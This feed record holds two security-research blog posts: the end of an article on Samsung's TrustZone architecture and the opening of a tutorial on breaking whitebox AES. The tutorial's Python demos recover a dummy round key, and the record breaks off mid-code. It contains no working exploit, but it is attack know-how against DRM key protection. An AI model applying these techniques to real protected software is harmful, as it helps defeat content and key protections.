running in Secure World;</li> \n   <li><strong>BL33:</strong> a bootloader based on U-boot for the NWd Android bootloader.</li> \n  </ul> \n  <img alt=\"\" class=\"align-center\" id=\"sboot-archi\" src=\"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/sboot_archi.png\" /> \n  <p>After Fernand's article was released, the monitor's implementation was replaced, starting from the Samsung Galaxy S8, by a high-entropy section, which suggests it was encrypted. It is unclear whether it was intended by Samsung in the first place or simply an after-the-fact reaction to prevent further research on the subject. To be able to read the monitor's code, an EL3 exploit is necessary, or at least a routine capable of reading the physical memory arbitrarily.</p> \n  <p>In the section <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-overview\">Trustonic's Trusted OS Kinibi</a>, a brief explanation was given on the implementation by Samsung of their own <em>Runtime Services</em>, which are registered using the structure given in the following snippet.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"n\">rt_svc_desc</span> <span class=\"p\">{</span>\n    <span class=\"kt\">uint8_t</span> <span class=\"n\">start_oen</span><span class=\"p\">;</span>\n    <span class=\"kt\">uint8_t</span> <span class=\"n\">end_oen</span><span class=\"p\">;</span>\n    <span class=\"kt\">uint8_t</span> <span class=\"n\">call_type</span><span class=\"p\">;</span>\n    <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">name</span><span class=\"p\">;</span>\n    <span class=\"n\">rt_svc_init_t</span> <span class=\"n\">init</span><span class=\"p\">;</span>\n    <span class=\"n\">rt_svc_handle_t</span> <span class=\"n\">handle</span><span class=\"p\">;</span>\n<span class=\"p\">}</span> <span class=\"n\">rt_svc_desc_t</span><span class=\"p\">;</span>\n</pre> \n  </div> \n  <p>These structures provide a handler for custom SMCs. An SMC is referenced by an OEN, which stands for <em>Owning Entity Numbers</em>. The structure defines a range of OEN numbers that will be processed by this specific handler. It will be used later on, in the part dedicated to the exploitation in EL3 in an upcoming article, where a SMC handler will be modified to achieve code execution.</p> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>In this first part, we explained the different components of Samsung's TrustZone based on Kinibi. While it is mainly theoretical, this article builds the foundations for the next parts of this series.</p> \n <p>In the following article, we will present tools that were developed during this research and how they were used to reverse engineer and exploit TrustZone components more easily.</p> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils citation\" frame=\"void\" id=\"ida-loader\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id2\">[IDA_LOADER]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/ghassani/mclf-ida-loader/\">https://github.com/ghassani/mclf-ida-loader/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"unbox\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id3\">[UNBOX]</a></td> \n    <td><a class=\"reference external\" href=\"https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c\">https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"sboot\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id4\">[SBOOT]</a></td> \n    <td><a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-samsung-s6-sboot-part-i.html\">https://blog.quarkslab.com/reverse-engineering-samsung-s6-sboot-part-i.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"teegris\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id1\">[TEEGRIS]</a></td> \n    <td><a class=\"reference external\" href=\"https://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html\">https://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html</a></td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"section\" id=\"acknowledgement\"> \n <h2>Acknowledgement</h2> \n <p>Thanks to all of our colleagues who proofread this article!</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 09 Dec 2019 23:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/hypervisor-based_arch.png","linkMd5":"b2c23f95ebaba9ba1a3e978aafc827d9","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn35@2020_6/2020/08/25/01-15-08-607_3219a6daa3b2006b.webp","destWidth":751,"destHeight":671,"sourceBytes":71750,"destBytes":55826,"author":"Alexandre Adamski","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/hypervisor-based_arch.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn35@2020_6/2020/08/25/01-15-08-607_3219a6daa3b2006b.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/arch_evolution.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn53@2020_3/2020/08/25/01-15-16-492_9e3bcffa88ba8717.webp","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/virtual_proc.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/on_soc.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/off_soc.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/scr.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn56@2020_6/2020/08/25/01-15-18-278_70b7f31aeeb27037.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/monitor_comm_nwd.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn84@2020_4/2020/08/25/01-15-15-226_f3385748d04bad41.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/exception_levels_aarch64.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn95@2020_6/2020/08/25/01-15-14-577_5f903c02c9bf6c07.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn20@2020_3/2020/08/25/01-15-13-145_e0d42c6719fbc10a.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_lib.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn31@2020_3/2020/08/25/01-15-13-214_f4a6f211a773ea80.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_intermediate.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn27@2020_4/2020/08/25/01-15-15-208_54cabc3812d124ef.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/TA_kinibi_format.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn23@2020_5/2020/08/25/01-15-12-649_9efbfe7744b0b9cd.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/ta_life_cycle.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn87@2020_2/2020/08/25/01-15-15-589_d9c5123e607fd10d.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/secure_driver.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn87@2020_1/2020/08/25/01-15-12-781_1f9316040b850669.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/img_hdr.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn65@2020_1/2020/08/25/01-15-15-808_5303b2c769d30d67.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/kinibi_archi_reverser.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn86@2020_3/2020/08/25/01-15-16-605_4d59503ae671a2ea.webp","http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/sboot_archi.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn51@2020_3/2020/08/25/01-15-14-358_1d6a49ffa5d43c09.webp"},"publishedOrCreatedDate":1598318092719},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Introduction to Whiteboxes and Collision-Based Attacks With QBDI","link":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","description":"<script type=\"text/javascript\">window.PlotlyConfig = {MathJaxConfig: 'local'};</script> \n<script src=\"https://cdn.plot.ly/plotly-latest.min.js\"></script> \n<style> .icon-ok { color: green; } .icon-remove { color: red; } .table-text-center { text-align: center !important; } .icon-meh { color: #fb9707; font-weight: bold; font-size: 30px; } </style> \n<div class=\"section\" id=\"introduction-and-purpose-of-this-post\"> \n <h2>Introduction, and purpose of this post</h2> \n <div class=\"section\" id=\"disclaimer\"> \n  <h3>Disclaimer</h3> \n  <p>This post is made to be an introduction to the field of whiteboxes. It is addressed to readers who have no previous experience analyzing such systems. We try to guide the reader from zero knowledge about the topic up to breaking a whitebox, using our tool <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#qbdi\" id=\"id1\">[QBDI]</a>. This without head-scratching maths or hundreds lines of code, so don't expect groundbreaking techniques or elite novelties :).</p> \n </div> \n <div class=\"section\" id=\"why-this-post\"> \n  <h3>Why this post?</h3> \n  <p>Whiteboxes may seem like a hard-to-reach subject, through this post we want to keep things simple both on the engineering side (because I can’t code), and the cryptographic side (because I can’t do maths and can’t write Mordor language). So, if like me you can’t do those, this post should be a great introduction!</p> \n  <div class=\"figure\"> \n   <img alt=\"black speech\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/mordor2.jpg\" style=\"width: 873.0px; height: 360.0px;\" /> \n  </div> \n  <p>In order to do so, in a first part we will talk about whiteboxes and concepts around them. Why they exist, use-cases and an introductory explanation based on whiteboxing the AES algorithm.</p> \n  <p>Whiteboxes are made to be broken, we will thus in the second part dig into a simple-to-understand (I believe) attack. By figuring out a few properties about AES, we will find a way to identify potential keys. We will then improve the identification process to distinguish the real key from all the potential ones.</p> \n  <p>Finally, we will study a public whitebox that we will break using the mentioned attack, based on traces generated thanks to QBDI.</p> \n  <blockquote>\n    Note: There are also a few resources that I recommend reading if you want to dig further \n   <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id23\" id=\"id2\">[1]</a> \n   <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id24\" id=\"id3\">[2]</a> \n   <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id25\" id=\"id4\">[3]</a> (and for French readers \n   <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id26\" id=\"id5\">[4]</a>) \n  </blockquote> \n </div> \n</div> \n<div class=\"section\" id=\"whiteboxes-why-and-how\"> \n <h2>Whiteboxes: why and how?</h2> \n <div class=\"section\" id=\"why-whiteboxes\"> \n  <h3>Why whiteboxes?</h3> \n  <p>To explain the need of whiteboxes, I will take the case of <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#drm\" id=\"id6\">[DRM]</a> (Digital Rights Management) protections for media content. You are basically in a case where you need to send a media to a client. This client should be able to play the media in the provided player and that is all. He should not be able to dump the data, play it from another device, etc.</p> \n  <p>This is something <strong>really</strong> hard to do, because - most of the time - the client has full control over the device, so you need to add all kinds of protections to prevent any pirate from accessing the raw content of the media.</p> \n  <p>To protect the content from “bad people”, various layers of protection are added (obfuscation, anti-debugs, code integrity, anti-lifting, cryptography...). The one of interest for us today is the cryptographic part.</p> \n  <p>Encryption restricts the access to the media to the sole users who have been granted the right permissions. It means the user is provided with a key to decrypt and play the DRM-ed content. This secret is really important and needs to be protected at all costs, because what would prevent somebody from sharing it with unauthorized users? That is the problem whitebox cryptography tries to address.</p> \n  <p><strong>The goal is to hide the key from the user, but still let him use it to decrypt the data, so he can still watch the latest Marvel movie.</strong></p> \n  <blockquote>\n    Note: In the case of a DRM-protected content, we would face a decryption algorithm, to recover the original data. For the rest of the article, we will however talk about encryption (both are similar in the way you would attack them). \n  </blockquote> \n </div> \n <div class=\"section\" id=\"whiteboxed-encryption-vs-standard-encryption\"> \n  <h3>Whiteboxed encryption VS standard encryption</h3> \n  <p>So how does one hide the encryption key of an algorithm? Let’s take the <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#aes\" id=\"id7\">[AES]</a> algorithm (quite commonly whiteboxed) and have a look at what changes between a whiteboxed and a \"clear\" algorithm.</p> \n  <div class=\"section\" id=\"reminders-about-aes\"> \n   <h4>Reminders about AES</h4> \n   <p>Quick reminder about AES, there are 3 variants based on the key length (128, 192 or 256 bits), and we will only look into AES-128 in this article. The mode of operation is not that important here because we will study the encryption of a single block of input (16 bytes). The encryption of a block is split in rounds (10, 12 or 14 rounds respectively, based on the key size) and is composed of 4 operations (the last round is a bit different but uses the same operations):</p> \n   <ul class=\"simple\"> \n    <li>AddRoundKey (the thing we want to protect in a whitebox context)</li> \n    <li>SubstituteBytes</li> \n    <li>ShiftRows</li> \n    <li>MixColumns</li> \n   </ul> \n   <blockquote>\n     Note: In this article, we consider that a round starts with \n    <strong>AddRoundKey</strong>, and ends just before the next \n    <strong>AddRoundKey</strong>. This is not an accurate definition of an AES round (see \n    <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#aes-round\" id=\"id8\">[AES_round]</a>), but delimiting rounds that way will be easier for the sake of the explanations. \n   </blockquote> \n   <p>In an attacker-controlled environment, it would be pretty easy for a “bad guy” to retrieve the key. He could statically look for data used in the algorithm to find the key. In the case it was not stored in cleartext, he would just need to find that <strong>AddRoundKey</strong> operation (which is a simple XOR between the state and the round key) to retrieve a round key.</p> \n   <blockquote>\n     Note: Retrieving a single round key is game over, as you can recover the encryption key from any of them by reversing the key schedule. In the specific case of AES-128, the first round key is equal to the encryption key itself. \n   </blockquote> \n   <p>To avoid this, whitebox cryptography hides the key in such a way that, even with full inspection capabilities (memory, registers), the attacker cannot directly see it. This is achieved by merging together the various operations of AES into huge tables of precomputed data (along with the round keys that are precomputed instead of relying on the runtime computation of those during the key scheduling phase). With those precomputed tables, the encryption round-key never appears in clear (being in a register, or memory), making it a bit harder to recover it.</p> \n   <p>Below is an example of what an attacker could observe on the first round (round 0) of a clear AES and on the first round of a whiteboxed AES. We used <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#phoenixaes\" id=\"id9\">[PhoenixAES]</a> to easily visualize each of the operation of AES, even if that is not the main usage of the tool:</p> \n   <blockquote>\n     Note: this is a demo, there are no real precomputed tables, just a supposed observing attacker. \n   </blockquote> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"kn\">import</span> <span class=\"nn\">phoenixAES</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">aes_round_0_whiteboxed</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Unknown implementation</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">):</span>\n    <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Original state</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">AddKey</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"AddRoundKey</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">))</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">SBox</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"SubstituteBytes</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">))</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">ShiftRow</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"ShiftRows</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">))</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">MC</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"MixColumns</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">))</span>\n    <span class=\"k\">return</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n\n<span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mh\">0xff</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"=== Plain AES ===</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"State after round 0</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">s</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"</span><span class=\"se\">\\n</span><span class=\"s2\">=== WB AES ===</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0_whiteboxed</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"State after round 0</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">s</span><span class=\"p\">)</span>\n</pre> \n   </div> \n   <pre class=\"literal-block\">\n=== Plain AES ===\n\nOriginal state       [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255]\nAddRoundKey  [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 254]\nSubstituteBytes      [124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 187]\nShiftRows    [124, 124, 124, 187, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\nMixColumns   [187, 187, 46, 233, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\nState after round 0  [187, 187, 46, 233, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\n\n=== WB AES ===\n\nOriginal state       [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255]\nState after round 0  [187, 187, 46, 233, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\n</pre> \n   <p>In the whiteboxed AES, the only thing observable is the original state and the state at the end of the round, the latter being produced using lookups into precomputed tables. The round key does not appear anywhere in the computation of the state (or at least, does not appear in clear).</p> \n   <p>Great, the key is hidden, but is that enough to protect it from being stolen? Obviously not, if you can do a bit of maths (and I can’t do maths either) it is pretty trivial to reverse the AES algorithm on a single round to recover the round key that was used. That is basically just the decryption process on a single round, as you can see below:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">def</span> <span class=\"nf\">reverse_round_0</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"n\">original_data</span><span class=\"p\">):</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">InvMC</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">InvShiftRow</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">InvSBox</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"n\">state</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">^</span><span class=\"n\">original_data</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)]</span>\n    <span class=\"k\">return</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># final state computed previously</span>\n<span class=\"n\">final_state</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">187</span><span class=\"p\">,</span> <span class=\"mi\">187</span><span class=\"p\">,</span> <span class=\"mi\">46</span><span class=\"p\">,</span> <span class=\"mi\">233</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">]</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"=== Rewind AES round 0 ===\"</span><span class=\"p\">)</span>\n<span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">reverse_round_0</span><span class=\"p\">(</span><span class=\"n\">final_state</span><span class=\"p\">,</span> <span class=\"n\">original_data</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Recovered key</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">k</span><span class=\"p\">)</span>\n</pre> \n   </div> \n   <pre class=\"literal-block\">\n=== Rewind AES round 0 ===\nRecovered key        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n</pre> \n  </div> \n  <div class=\"section\" id=\"internal-encodings-to-protect-whiteboxes\"> \n   <h4>Internal encodings to protect whiteboxes</h4> \n   <p>With the key being “hidden” in the precomputed tables, we already moved a step forward, but as we saw, an attacker who can encrypt a block of data, and who can observe the state of the AES at the end of the first round, could trivially recover the used key (because he knows both the input data and the final state). That is an issue that whiteboxes designers try to solve using what is called <strong>internal encodings</strong>.</p> \n   <p>I won’t go into the full design and purpose of those (because it’s maths, and crypto... :( ), but basically the point is to not let an attacker observe the state of AES in clear at any point during the algorithm. For this, typically, each byte is encoded into another using a bijective function (so each input byte has only one corresponding output byte, and the other way around).</p> \n   <p>If you were to observe the state at the end of a round, you would not be able to recover the key, without knowing this bijection. (And such bijection is precomputed into the tables... things start to get messy!)</p> \n   <p>Let’s have an example below. We will take the <tt class=\"docutils literal\">final_state</tt> previously computed, and suppose that the bijection (for x in [0,256]) used in the tables was:</p> \n   <div class=\"math\">\n     \\begin{equation*} f(x) = (x+1) \\% 256 \\end{equation*} \n   </div> \n   <p>With that encoded state, can we recover the key?</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"c1\"># final state computed previously</span>\n<span class=\"n\">final_state</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">187</span><span class=\"p\">,</span> <span class=\"mi\">187</span><span class=\"p\">,</span> <span class=\"mi\">46</span><span class=\"p\">,</span> <span class=\"mi\">233</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">]</span>\n<span class=\"n\">encoded_state</span> <span class=\"o\">=</span> <span class=\"p\">[(</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">%</span><span class=\"mi\">256</span> <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"n\">final_state</span><span class=\"p\">]</span>\n\n<span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mh\">0xff</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"=== Rewind AES round 0 ===\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Encoded state</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">encoded_state</span><span class=\"p\">)</span>\n<span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">reverse_round_0</span><span class=\"p\">(</span><span class=\"n\">final_state</span><span class=\"p\">,</span> <span class=\"n\">original_data</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Recovered key (from plain state)</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">k</span><span class=\"p\">)</span>\n<span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">reverse_round_0</span><span class=\"p\">(</span><span class=\"n\">encoded_state</span><span class=\"p\">,</span> 